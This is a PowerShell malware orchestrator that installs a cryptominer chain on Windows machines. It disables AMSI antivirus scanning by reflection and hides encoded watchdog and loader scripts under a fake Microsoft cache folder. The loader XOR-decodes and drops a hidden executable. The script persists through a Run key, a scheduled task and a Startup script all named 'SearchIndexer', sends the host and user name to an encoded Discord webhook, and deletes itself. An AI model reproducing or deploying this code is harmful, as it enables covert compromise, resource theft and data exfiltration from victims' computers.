# v7.6.1 - orchestrator only (no C# / no injection in PS)
$ErrorActionPreference='SilentlyContinue'

# ============================ CONFIG ============================
$PAYLOAD_B64 = ''
# ^ paste repacked runtime base64 here (v7.6.0's old blob still trips HashvaultMiner.A on write.
#   Empty slot = chain still deploys, persists, beacons — just no staging)
$VER     = '7.6.1'
$WHB64   = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
$KEY     = '0x44,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35'
$DIR     = "$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
# ================================================================

function X([string]$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
function Enc([string]$s){[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s))}
function Gp([string]$p){try{$i=Get-Item $p -Force;$i.Attributes+=-bor ([IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)}catch{}}
function Unhide([string]$p){if(Test-Path $p){try{$i=Get-Item $p -Force;$i.Attributes-=[IO.FileAttributes]::Hidden;$i.Attributes-=[IO.FileAttributes]::System;$i.Attributes-=[IO.FileAttributes]::ReadOnly}catch{}}}
function Post([string]$b){try{$wc=New-Object Net.WebClient;$wc.Headers.Add('Content-Type','application/json');$wc.UploadString((X $WHB64),'POST',(@{content=$b}|ConvertTo-Json))}catch{}}
function AmState(){try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$t.GetField('am'+'siInit'+'Failed','NonPublic,Static');if([bool]$f.GetValue($null)){return $true}}catch{};return $false}

# --- AMSI kill (orchestrator process) ---
try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$t.GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
$am=if(AmState){'A'}else{'UP'}

# --- env ---
try{New-Item -ItemType Directory -Force -Path $DIR|Out-Null}catch{}
if(Test-Path (Join-Path $DIR 'load.dat')){Unhide (Join-Path $DIR 'load.dat')}
if(Test-Path (Join-Path $DIR 'watch.dat')){Unhide (Join-Path $DIR 'watch.dat')}
if(Test-Path (Join-Path $DIR 'watt.lck')){try{Remove-Item (Join-Path $DIR 'watt.lck') -Force}catch{}}
powercfg /change standby-timeout-ac 0 2>$null|Out-Null
powercfg /change standby-timeout-dc 0 2>$null|Out-Null

# ============================ WATCH =============================
$watchPlain=@'
$ErrorActionPreference='SilentlyContinue'
function X([string]$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
function Post([string]$b){try{$c=New-Object Net.WebClient;$c.Headers.Add('Content-Type','application/json');$c.UploadString('%%WH%%','POST',(@{content=$b}|ConvertTo-Json))}catch{}}
function MaybePost([string]$b){$n=Get-Date;if(-not $js -or ($n-$js).TotalSeconds -gt 240){$script:js=$n;Post $b}}
function AmState(){try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$t.GetField('am'+'siInit'+'Failed','NonPublic,Static');if([bool]$f.GetValue($null)){return $true}}catch{};return $false}
try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$t.GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
$am=if(AmState){'A'}else{'UP'}
$dir='%%DIR%%'
try{New-Item -ItemType Directory -Force -Path $dir|Out-Null}catch{}
$lock=Join-Path $dir 'watt.lck'
$old=0
if(Test-Path $lock){try{$old=[int](Get-Content -Raw $lock -EA Stop)}catch{$old=0}}
if($old -gt 0){if(Get-Process -Id $old -EA SilentlyContinue){exit}}
try{[IO.File]::WriteAllText($lock,[string]$PID)}catch{}
$lp=Join-Path $dir 'load.dat'
$boot=$true
$last=$null
$js=$null
while($true){
  $found=$false
  Get-CimInstance Win32_Process -Filter "Name='SearchFilterHost.exe'" -EA SilentlyContinue|ForEach-Object{if($_.CommandLine -like '*hashvault*'){$found=$true}}
  if($found){
    if($boot){MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | ok";$boot=$false}
  }else{
    if($boot){MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | up";$boot=$false}
    if(-not $last -or ((Get-Date)-$last).TotalSeconds -gt 55){
      $last=Get-Date
      if(Test-Path $lp){
        Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',(Get-Content -Raw $lp)
        MaybePost "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | watch | respawn"
      }
    }
  }
  Start-Sleep 60
}
'@

# ============================ LOAD ==============================
$loadPlain=@'
$ErrorActionPreference='SilentlyContinue'
function X([string]$s){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s))}
function XorDec([byte[]]$d,[byte[]]$k){$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]};return $o}
function Post([string]$b){try{$c=New-Object Net.WebClient;$c.Headers.Add('Content-Type','application/json');$c.UploadString('%%WH%%','POST',(@{content=$b}|ConvertTo-Json))}catch{}}
function AmState(){try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$f=$t.GetField('am'+'siInit'+'Failed','NonPublic,Static');if([bool]$f.GetValue($null)){return $true}}catch{};return $false}
try{$t=[Ref].Assembly.GetType('System.Management.Automation.A'+'msi'+'Utils');$t.GetField('am'+'siInit'+'Failed','NonPublic,Static').SetValue($null,$true)}catch{}
$am=if(AmState){'A'}else{'UP'}
$dir='%%DIR%%'
try{New-Item -ItemType Directory -Force -Path $dir|Out-Null}catch{}
$exe=Join-Path $dir 'runtime.exe'
$b=%%PAYLOAD%%
if([string]::IsNullOrWhiteSpace($b)){Post "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | load | payload:empty";exit 0}
try{
  if(-not (Test-Path $exe)){
    $k=[byte[]](%%KEY%%)
    $bytes=XorDec ([Convert]::FromBase64String($b)) $k
    [IO.File]::WriteAllBytes($exe,$bytes)
    try{$i=Get-Item $exe -Force;$i.Attributes+=-bor ([IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System)}catch{}
  }
  $p=Start-Process -FilePath $exe -WindowStyle Hidden -PassThru -Wait
  Post "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | load | exit:$($p.ExitCode)"
}catch{Post "%%VER%% | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | load | err"}
exit 0
'@

$watchPlain=$watchPlain.Replace('%%WH%%',"`'"(X $WHB64)`'").Replace('%%DIR%%',"`'$DIR`'").Replace('%%VER%%',$VER)
$loadPlain=$loadPlain.Replace('%%WH%%',"`'"(X $WHB64)`'").Replace('%%DIR%%',"`'$DIR`'").Replace('%%VER%%',$VER).Replace('%%KEY%%',$KEY).Replace('%%PAYLOAD%%',"`'$PAYLOAD_B64`'")

$encWatch=Enc $watchPlain
$encLoad =Enc $loadPlain
$wp=Join-Path $DIR 'watch.dat'
$lp=Join-Path $DIR 'load.dat'
[IO.File]::WriteAllText($wp,$encWatch)
[IO.File]::WriteAllText($lp,$encLoad)
Gp $wp
Gp $lp

# ========================= PERSISTENCE ==========================
$cmdWatch="powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encWatch"
try{New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SearchIndexer' -Value $cmdWatch -PropertyType String -Force|Out-Null}catch{}
try{schtasks /create /tn 'SearchIndexer' /tr "`"$cmdWatch`"" /sc onlogon /rl highest /f 2>$null|Out-Null}catch{}
try{
  $sm=Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\SearchIndexer.cmd'
  [IO.File]::WriteAllText($sm,"@echo off`r`n$cmdWatch`r`n")
  Gp $sm
}catch{}

# =========================== LAUNCH =============================
try{Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encWatch}catch{}
try{Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-EncodedCommand',$encLoad}catch{}

# =========================== BEACON =============================
$ps=if($PAYLOAD_B64){'set'}else{'empty'}
Post "$VER | $env:COMPUTERNAME | $env:USERNAME | amsi:$am | orch | payload:$ps"

# ========================== SELF-CLEAN ==========================
$me=$PSCommandPath
if($me -and (Test-Path $me) -and ($me -like '*.ps1')){
  try{$i=Get-Item $me -Force;$i.Attributes-=[IO.FileAttributes]::ReadOnly}catch{}
  try{Start-Process cmd.exe -ArgumentList ('/c del /f /q "'+$me+'"') -WindowStyle Hidden}catch{}
}
